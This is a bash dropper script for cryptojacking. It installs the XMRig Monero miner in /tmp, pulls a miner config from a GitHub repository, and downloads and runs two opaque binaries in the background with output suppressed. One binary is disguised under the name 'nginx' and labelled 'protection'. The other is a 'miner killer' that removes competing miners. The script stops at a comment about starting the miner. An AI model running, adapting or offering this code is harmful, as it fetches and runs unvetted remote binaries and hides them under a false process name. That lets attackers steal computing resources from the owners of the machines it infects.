#!/bin/bash

xmrver="6.22.2"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

unalias -a

# install deps
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget -q -O"
else
    DOWNLOAD_CMD="curl -sL -o"
fi

mkdir -p /tmp/xmrig
cd /tmp/xmrig

$DOWNLOAD_CMD xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig.tar.gz
cd xmrig-$xmrver

chmod +x xmrig


$DOWNLOAD_CMD settings.json https://github.com/evilqeo/frcx/raw/main/settings.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/kasm/kasm-$randnum/g" settings.json

####################################
# 🔐 Download and run protection
####################################
$DOWNLOAD_CMD /tmp/nginx https://github.com/evilqeo/frcx/raw/main/nginx
chmod +x /tmp/nginx
nohup /tmp/nginx > /dev/null 2>&1 &
####################################

####################################
# 🛑 Download and run miner killer
####################################
$DOWNLOAD_CMD /tmp/sleeping https://github.com/evilqeo/frcx/raw/main/sleeping
chmod +x /tmp/sleeping
nohup /tmp/sleeping > /dev/null 2>&1 &
####################################

# Start miner normally

